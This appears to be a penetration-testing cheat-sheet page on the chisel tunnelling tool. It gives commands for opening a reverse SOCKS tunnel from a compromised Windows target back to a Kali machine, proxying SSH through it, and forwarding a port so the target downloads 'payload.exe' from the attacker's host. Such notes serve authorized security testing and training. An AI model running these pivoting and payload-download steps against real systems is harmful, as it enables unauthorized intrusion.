---
layout: default
title: Chisel
parent: Network
nav_order: 1
permalink: /network/chisel/
---

# Chisel
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Exploit

Server and client can be both started with [Chisel](https://github.com/jpillora/chisel).

```bash
# Start chisel server on your Kali.
chisel server --port $lport --reverse

# Start chisel client on a Windows target.
chisel.exe client $lhost:$lport R:socks

# Modify /etc/proxychains4.conf.
socks5 127.0.0.1 1080

# Create a proxyfied ssh tunnel through the chisel client to your target.
ssh -o ProxyCommand="ncat --proxy-type socks5 --proxy 127.0.0.1:$socks_port %h %p" $username@$target
```

You might want to reverse commands back to your server from a host that can only access your client. It could be the case if you want to download a payload which is served on your Kali with `python -m http.server 80` but you can't access by doing `iwr -uri http://$lhost:80/payload.exe -outfile payload.exe`. In such a case, configure a remote connection that will tunnel the commands you will send to the client back to the server.

```bash
# With chisel run like this, you can run `iwr -uri http://$client:9999/payload.exe -outfile payload.exe` from your target.
chisel.exe client $lhost:$lport R:socks 0.0.0.0:9999:$lhost:80
```

{: .important }
> If you want to perform port scanning through port tunneling, you should consider using [Naabu](/network/scanning/#naabu).